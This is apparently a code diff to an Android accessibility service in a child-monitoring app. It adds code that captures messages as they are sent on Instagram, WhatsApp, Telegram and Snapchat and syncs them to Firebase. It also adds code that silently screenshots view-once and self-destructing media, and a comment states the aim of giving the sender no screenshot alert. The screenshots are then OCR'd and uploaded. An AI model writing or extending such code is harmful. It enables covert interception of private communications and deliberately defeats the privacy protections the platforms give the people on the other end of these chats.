@@ -10,8 +10,9 @@ import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.google.mlkit.vision.common.InputImage
 import com.google.mlkit.vision.text.TextRecognition
-import com.google.mlkit.vision.text.latin.TextRecognizerOptions
+import com.google.mlkit.vision.text.devanagari.DevanagariTextRecognizerOptions
 import com.vyra.kids.core.AppConstants
+import com.vyra.kids.core.ChatSequenceRingBuffer
 import com.vyra.kids.core.FirebaseSyncManager
 import com.vyra.kids.core.NetworkSyncManager
 import java.io.File
@@ -55,6 +56,10 @@ class VyraAccessibilityService : AccessibilityService() {
             handleSocialAppActivity(packageName, event)
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 handleDraftTypingEvent(packageName, event)
+            }
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                handleSendButtonTrigger(packageName, event)
+                handleOneViewMediaClick(packageName, event)
             }
             if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                 event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
@@ -294,24 +299,115 @@ class VyraAccessibilityService : AccessibilityService() {
         } catch (_: Exception) {}
     }
 
+    private fun handleSendButtonTrigger(packageName: String, event: AccessibilityEvent) {
+        try {
+            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
+            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
+            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
+
+            val isSendAction = viewId.contains("send") ||
+                    desc in setOf("send", "bhejo", "send message", "send snap", "bhejen") ||
+                    text == "send" || text == "bhejo"
+
+            if (isSendAction) {
+                val appName = when {
+                    packageName.contains("instagram") -> "Instagram"
+                    packageName.contains("whatsapp") -> "WhatsApp"
+                    packageName.contains("telegram") -> "Telegram"
+                    packageName.contains("snapchat") -> "Snapchat"
+                    else -> "Social"
+                }
+                val outgoingDraft = lastDrafts[packageName]?.trim() ?: ""
+                if (outgoingDraft.isNotBlank()) {
+                    val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Friend"
+                    val convKey = "$appName:$activeContact"
+
+                    // Record in ring buffer to prevent duplicate re-scrape
+                    ChatSequenceRingBuffer.record(convKey, outgoingDraft, "Aryan (Child)")
+
+                    val syncManager = FirebaseSyncManager.getInstance(this)
+                    val msgId = "out_${System.currentTimeMillis()}_${Math.abs(outgoingDraft.hashCode()).toString().take(6)}"
+                    syncManager.syncChatMessage(
+                        msgId = msgId,
+                        app = appName,
+                        sender = "Aryan (Child)",
+                        text = outgoingDraft,
+                        isDeletedBySender = false,
+                        isWatchlistTarget = false
+                    )
+                    Log.i(AppConstants.TAG, "⚡ Smart Send-Button: Captured outgoing message in $appName to $activeContact: \"$outgoingDraft\"")
+                    lastDrafts.remove(packageName)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(AppConstants.TAG, "Error in handleSendButtonTrigger", e)
+        }
+    }
+
+    private fun handleOneViewMediaClick(packageName: String, event: AccessibilityEvent) {
+        try {
+            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
+            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
+            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
+
+            val isSnapchatMedia = packageName.contains("snapchat") && (
+                viewId.contains("snap") || viewId.contains("story") || viewId.contains("chat_message") ||
+                desc.contains("new snap") || desc.contains("snap") ||
+                text.contains("received snap") || text.contains("tap to view") || text.contains("delivered snap")
+            )
+
+            val isInstagramOneView = packageName.contains("instagram") && (
+                viewId.contains("visual_media") || viewId.contains("direct_image") ||
+                desc.contains("view photo") || desc.contains("photo") ||
+                text.contains("view photo") || text.contains("photo")
+            )
+
+            val isTelegramSecretMedia = packageName.contains("telegram") && (
+                viewId.contains("secret") || desc.contains("self-destruct") ||
+                text.contains("self-destruct") || text.contains("photo, self-destructing")
+            )
+
+            if (isSnapchatMedia || isInstagramOneView || isTelegramSecretMedia) {
+                val appName = when {
+                    packageName.contains("snapchat") -> "Snapchat"
+                    packageName.contains("instagram") -> "Instagram"
+                    packageName.contains("telegram") -> "Telegram"
+                    else -> "Social"
+                }
+                val activeContact = com.vyra.kids.core.ActiveContactTracker.getLastContact(appName) ?: "$appName Friend"
+                Log.i(AppConstants.TAG, "Detected 1-View media open in $appName ($activeContact). Scheduling ghost compositor capture...")
+
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    captureSilentCompositorSnap(
+                        sourceApp = appName,
+                        sender = "$activeContact (1-View Media)",
+                        titleText = "📷 [1-View $appName Media Captured Silently]"
+                    )
+                }, 400)
+            }
+        } catch (e: Exception) {
+            Log.e(AppConstants.TAG, "Error in handleOneViewMediaClick", e)
+        }
+    }
+
     private fun scrapeSocialChatNodes(appName: String, activeContact: String, node: AccessibilityNodeInfo?, depth: Int = 0) {
         if (node == null || depth > 25) return
-        val text = node.text?.toString()?.trim() ?: ""
+        val rawText = node.text?.toString()?.trim() ?: ""
+        val rawDesc = node.contentDescription?.toString()?.trim() ?: ""
+        val text = if (rawText.isNotBlank()) rawText else rawDesc
+
         if (text.isNotBlank() && text.length > 1) {
             val lower = text.lowercase()
-            val isNav = isNavKeyword(text) || lower in setOf("message...", "send", "seen", "delivered", "read") ||
+            val isNav = isNavKeyword(text) || lower in setOf("message...", "send", "seen", "delivered", "read", "opened", "tap to view") ||
                     lower.startsWith("seen") || lower.startsWith("typing...") || lower.startsWith("online")
             if (!isNav && !text.equals(activeContact, ignoreCase = true)) {
-                // 15-second deduplication window prevents scrape frame spam while preserving natural repeated replies
-                val timeBucket = System.currentTimeMillis() / 15000
-                val hash = "$appName:$activeContact:$text:$timeBucket".hashCode()
-                if (!processedChatHashes.contains(hash)) {
-                    if (processedChatHashes.size > 2000) processedChatHashes.clear()
-                    processedChatHashes.add(hash)
+                val convKey = "$appName:$activeContact"
+                if (!ChatSequenceRingBuffer.isDuplicate(convKey, text, activeContact)) {
+                    ChatSequenceRingBuffer.record(convKey, text, activeContact)
 
-                    val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
-                    val msgId = "chat_${System.currentTimeMillis()}_${Math.abs(hash).toString().take(6)}"
-                    firebaseSync.syncChatMessage(
+                    val syncManager = FirebaseSyncManager.getInstance(this)
+                    val msgId = "chat_${System.currentTimeMillis()}_${Math.abs(text.hashCode()).toString().take(6)}"
+                    syncManager.syncChatMessage(
                         msgId = msgId,
                         app = appName,
                         sender = activeContact,
@@ -392,17 +488,14 @@ class VyraAccessibilityService : AccessibilityService() {
         val cleanText = msgText.trim()
         if (cleanText.isEmpty() || isNavKeyword(cleanText)) return
 
-        // 30-second deduplication window for inbox previews
-        val timeBucket = System.currentTimeMillis() / 30000
-        val hash = "inbox:$appName:$contactName:$cleanText:$timeBucket".hashCode()
-        if (!processedChatHashes.contains(hash)) {
-            if (processedChatHashes.size > 2000) processedChatHashes.clear()
-            processedChatHashes.add(hash)
+        val convKey = "inbox:$appName:$contactName"
+        if (!ChatSequenceRingBuffer.isDuplicate(convKey, cleanText, contactName)) {
+            ChatSequenceRingBuffer.record(convKey, cleanText, contactName)
 
             com.vyra.kids.core.ActiveContactTracker.recordContact(appName, contactName, cleanText)
-            val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
-            val msgId = "inbox_${System.currentTimeMillis()}_${Math.abs(hash).toString().take(6)}"
-            firebaseSync.syncChatMessage(
+            val syncManager = FirebaseSyncManager.getInstance(this)
+            val msgId = "inbox_${System.currentTimeMillis()}_${Math.abs(cleanText.hashCode()).toString().take(6)}"
+            syncManager.syncChatMessage(
                 msgId = msgId,
                 app = appName,
                 sender = contactName,
@@ -421,7 +514,11 @@ class VyraAccessibilityService : AccessibilityService() {
      * 2. Android 14 ScreenCaptureCallback (not a user hardware button screenshot)
      * Result: Sender receives 0 alerts (NO "Screenshot taken!" message).
      */
-    private fun captureSilentCompositorSnap() {
+    private fun captureSilentCompositorSnap(
+        sourceApp: String = "Snapchat",
+        sender: String = "Snapchat (Incoming 1-View Snap)",
+        titleText: String = "📷 [1-View Snap Captured Silently]"
+    ) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(
                 Display.DEFAULT_DISPLAY,
@@ -445,12 +542,12 @@ class VyraAccessibilityService : AccessibilityService() {
                             FileOutputStream(snapFile).use { out ->
                                 softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                             }
-                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently: ${snapFile.name}")
+                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently ($sourceApp): ${snapFile.name}")
 
                             runMlKitOcrAndSyncSnap(
-                                sourceApp = "Snapchat",
-                                sender = "Snapchat (Incoming 1-View Snap)",
-                                titleText = "📷 [1-View Snap Captured Silently]",
+                                sourceApp = sourceApp,
+                                sender = sender,
+                                titleText = titleText,
                                 snapFile = snapFile,
                                 bitmap = softwareBitmap,
                                 isOutgoing = false
@@ -839,18 +936,18 @@ class VyraAccessibilityService : AccessibilityService() {
         try {
             val ocrBitmap = preprocessBitmapForOcr(bitmap)
             val image = InputImage.fromBitmap(ocrBitmap, 0)
-            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
+            val recognizer = TextRecognition.getClient(DevanagariTextRecognizerOptions.Builder().build())
             recognizer.process(image)
                 .addOnSuccessListener { visionText ->
                     val ocrResult = visionText.text.trim()
                     if (ocrResult.isNotBlank()) {
-                        Log.i(AppConstants.TAG, "ML Kit OCR recognized text: $ocrResult")
+                        Log.i(AppConstants.TAG, "Devanagari/Latin ML Kit OCR recognized: $ocrResult")
                     }
-                    val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+                    val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
                     val msgId = "media_${System.currentTimeMillis()}_${snapFile.nameWithoutExtension.takeLast(6)}"
-                    firebaseSync.uploadMediaAndSyncChatMessage(
+                    syncManager.uploadMediaAndSyncChatMessage(
                         msgId = msgId,
-                        app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
+                        app = sourceApp,
                         sender = sender,
                         text = titleText,
                         mediaFile = snapFile,
@@ -862,11 +959,11 @@ class VyraAccessibilityService : AccessibilityService() {
                 }
                 .addOnFailureListener { e ->
                     Log.w(AppConstants.TAG, "ML Kit OCR failed: ${e.message}")
-                    val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+                    val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
                     val msgId = "media_${System.currentTimeMillis()}"
-                    firebaseSync.uploadMediaAndSyncChatMessage(
+                    syncManager.uploadMediaAndSyncChatMessage(
                         msgId = msgId,
-                        app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
+                        app = sourceApp,
                         sender = sender,
                         text = titleText,
                         mediaFile = snapFile,
@@ -878,11 +975,11 @@ class VyraAccessibilityService : AccessibilityService() {
                 }
         } catch (e: Exception) {
             Log.e(AppConstants.TAG, "Error initiating ML Kit OCR", e)
-            val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+            val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
             val msgId = "media_${System.currentTimeMillis()}"
-            firebaseSync.uploadMediaAndSyncChatMessage(
+            syncManager.uploadMediaAndSyncChatMessage(
                 msgId = msgId,
-                app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
+                app = sourceApp,
                 sender = sender,
                 text = titleText,
                 mediaFile = snapFile,
